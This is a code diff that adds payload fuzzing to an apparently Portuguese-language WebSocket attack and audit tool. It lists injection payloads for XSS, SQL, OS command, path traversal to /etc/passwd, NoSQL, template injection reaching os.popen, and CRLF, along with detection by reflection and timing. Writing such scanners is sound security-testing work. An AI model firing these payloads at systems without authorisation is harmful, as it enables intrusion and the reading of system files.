@@ -16,9 +16,27 @@ Testa endpoints WebSocket para vulnerabilidades:
 
   - WS Compression Bomb: compressao para causar bomba de dados
 
+  - WS Payload Fuzzing: XSS, SQLi, CMDi, Path Traversal, NoSQL, SSTI, Log Injection
+
 
 
 IMPORTANTE: Usa raw sockets — sem biblioteca websocket externa.
+
+Detecção:
+
+  - Reflection-based: servidor ecoa o payload (XSS, Path Traversal, SSTI)
+
+  - Timing-based: servidor processa o payload com delay (SQLi sleep, CMDi sleep)
+
+  - Connection close: servidor fecha conexão (Log Injection CRLF)
+
+Notas:
+
+  - SQLi/CMDi/SSTI timing: thresholds calibrados para sleep(5s)
+
+  - NoSQL timing: menos confiável — MongoDB usa sleep(ms) com threshold 8s
+
+  - APIs WS que não refletem input nem processam delays não serão detectadas
 
 """
 
@@ -33,6 +51,7 @@ import os
 import socket
 import ssl
 import struct
+import time
 from collections.abc import Callable, Coroutine
 from dataclasses import asdict, dataclass
 from typing import Any
@@ -147,7 +166,129 @@ _CATEGORY_MAP: dict[str, list[str]] = {
 
     ],
 
+    "ws_payload_fuzz": [
+
+        "xss_reflected",
+
+        "sqli_error",
+
+        "cmdi_os",
+
+        "path_traversal",
+
+        "nosql_injection",
+
+        "template_injection",
+
+        "log_injection",
+
+    ],
+
 }
+
+
+
+# ─── Payload Fuzzing Data ────────────────────────────────────────────────────
+
+# (technique, description, refl_payloads, indicators, timing_payloads, timing_threshold)
+
+_PAYLOADS_WS_FUZZ: list[tuple[str, str, list[str], list[str], list[str], float]] = [
+    (
+        "xss_reflected",
+        "XSS via WebSocket messages",
+        [
+            '<script>alert(1)</script>',
+            '"><img src=x onerror=alert(1)>',
+            "javascript:alert(1)",
+            "<svg/onload=alert(1)>",
+            '{{constructor.constructor("alert(1)")()}}',
+        ],
+        ["<script>", "onerror=", "javascript:", "<svg", "constructor"],
+        [],
+        0.0,
+    ),
+    (
+        "sqli_error",
+        "SQL injection via WebSocket",
+        [
+            "' OR 1=1--",
+            "' UNION SELECT NULL--",
+            "'; WAITFOR DELAY '0:0:5'--",
+            "' AND 1=CONVERT(int,@@version)--",
+            "1' ORDER BY 100--",
+        ],
+        ["syntax error", "SQL", "mysql", "ORA-", "PostgreSQL", "SQLite", "unterminated"],
+        ["'; WAITFOR DELAY '0:0:5'--", "'; SELECT SLEEP(5)--", "' AND pg_sleep(5)--"],
+        7.0,
+    ),
+    (
+        "cmdi_os",
+        "OS command injection via WebSocket",
+        [
+            "; id",
+            "| whoami",
+            "`id`",
+            "$(id)",
+            "; cat /etc/passwd",
+        ],
+        ["uid=", "root:", "www-data", "nt authority", "linux"],
+        ["; sleep 5", "| timeout 5", "; ping -c 5 127.0.0.1"],
+        7.0,
+    ),
+    (
+        "path_traversal",
+        "Path traversal via WebSocket",
+        [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+            "....//....//....//etc/passwd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        ],
+        ["root:", "localhost", "127.0.0.1", "daemon", "[hosts]"],
+        [],
+        0.0,
+    ),
+    (
+        "nosql_injection",
+        "NoSQL injection via WebSocket",
+        [
+            '{"username": {"$gt": ""}}',
+            '{"username": {"$ne": null}}',
+            '{"$where": "this.password.match(/a/)"}',
+            '{"username": "admin", "$or": [{"a":"a"}]}',
+        ],
+        ["$where", "$gt", "$ne", "$or", "MongoError", "CastError"],
+        ['{"$where": "sleep(3000)"}'],
+        8.0,
+    ),
+    (
+        "template_injection",
+        "SSTI via WebSocket",
+        [
+            "{{7*7}}",
+            "${7*7}",
+            "<%= 7*7 %>",
+            "#{7*7}",
+            "{{config.items()}}",
+        ],
+        ["49", "items()", "SECRET_KEY", "SQLALCHEMY"],
+        ["{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}"],
+        7.0,
+    ),
+    (
+        "log_injection",
+        "CRLF/log injection via WebSocket",
+        [
+            "\r\n[INJECTED]",
+            "\r\nSeverity: CRITICAL",
+            "\nINJECTED_LINE",
+            "\r\n2024-01-01 INJECTED",
+        ],
+        [],
+        [],
+        0.0,
+    ),
+]
 
 
 
@@ -2003,6 +2144,112 @@ async def _test_ws_compression_bomb(
 
 
 
+async def _test_ws_payload_fuzz(
+    host: str,
+    port: int,
+    path: str,
+    timeout: float,
+    tls: bool,
+    b_status: int,
+    b_size: int,
+) -> list[WSAttackAttempt]:
+    """Testa payload fuzzing em WebSocket (reflection + timing)."""
+
+    results: list[WSAttackAttempt] = []
+
+    for technique, desc, refl_payloads, indicators, timing_payloads, timing_threshold in _PAYLOADS_WS_FUZZ:
+        # --- Reflection-based detection ---
+        for payload_str in refl_payloads:
+            conn = _ws_handshake(host, port, path, timeout, tls)
+            if not conn:
+                continue
+            sock, _key = conn
+            try:
+                _send_ws_frame(sock, WS_OPCODE_TEXT, payload_str.encode(), mask=True)
+                response = _recv_ws_frame(sock, timeout)
+
+                if response is None:
+                    if technique == "log_injection":
+                        results.append(WSAttackAttempt(
+                            technique=technique,
+                            category="ws_payload_fuzz",
+                            description=desc,
+                            status_baseline=b_status,
+                            status_test=0,
+                            size_baseline=b_size,
+                            size_test=0,
+                            vulnerable=True,
+                            details=f"Server closed connection after: {payload_str[:50]}",
+                            error="",
+                        ))
+                    continue
+
+                resp_opcode, resp_payload = response
+
+                if resp_opcode == WS_OPCODE_CLOSE and technique == "log_injection":
+                    results.append(WSAttackAttempt(
+                        technique=technique,
+                        category="ws_payload_fuzz",
+                        description=desc,
+                        status_baseline=b_status,
+                        status_test=0,
+                        size_baseline=b_size,
+                        size_test=0,
+                        vulnerable=True,
+                        details=f"Server sent close frame after: {payload_str[:50]}",
+                        error="",
+                    ))
+                    continue
+
+                if resp_opcode == WS_OPCODE_TEXT:
+                    body = resp_payload.decode(errors="ignore")
+                    if any(ind in body for ind in indicators):
+                        results.append(WSAttackAttempt(
+                            technique=technique,
+                            category="ws_payload_fuzz",
+                            description=desc,
+                            status_baseline=b_status,
+                            status_test=200,
+                            size_baseline=b_size,
+                            size_test=len(resp_payload),
+                            vulnerable=True,
+                            details=f"Reflected: {payload_str[:50]}",
+                            error="",
+                        ))
+            finally:
+                sock.close()
+
+        # --- Timing-based detection ---
+        for payload_str in timing_payloads:
+            conn = _ws_handshake(host, port, path, timeout, tls)
+            if not conn:
+                continue
+            sock, _key = conn
+            try:
+                t0 = time.monotonic()
+                _send_ws_frame(sock, WS_OPCODE_TEXT, payload_str.encode(), mask=True)
+                _recv_ws_frame(sock, timeout)
+                elapsed = time.monotonic() - t0
+
+                if elapsed >= timing_threshold:
+                    results.append(WSAttackAttempt(
+                        technique=f"{technique}_timing",
+                        category="ws_payload_fuzz",
+                        description=f"{desc} (timing: {elapsed:.1f}s)",
+                        status_baseline=b_status,
+                        status_test=200,
+                        size_baseline=b_size,
+                        size_test=0,
+                        vulnerable=True,
+                        details=f"Response took {elapsed:.1f}s (threshold: {timing_threshold}s)",
+                        error="",
+                    ))
+            finally:
+                sock.close()
+
+    return results
+
+
 # ─── Dispatch ────────────────────────────────────────────────────────────────
 
 
@@ -2018,6 +2265,8 @@ _CATEGORY_DISPATCH: dict[str, Callable[..., Coroutine[Any, Any, list[WSAttackAtt
     "ws_dos": _test_ws_dos,
 
     "ws_compression_bomb": _test_ws_compression_bomb,
+
+    "ws_payload_fuzz": _test_ws_payload_fuzz,
 
 }
 
@@ -2251,7 +2500,7 @@ def build_parser() -> argparse.ArgumentParser:
 
         prog="mytools-wsattack",
 
-        description="WebSocket Security — CSWSH, Upgrade Abuse, Message Inject, DoS, Compression Bomb",
+        description="WebSocket Security — CSWSH, Upgrade Abuse, Message Inject, DoS, Compression Bomb, Payload Fuzzing",
 
     )
 
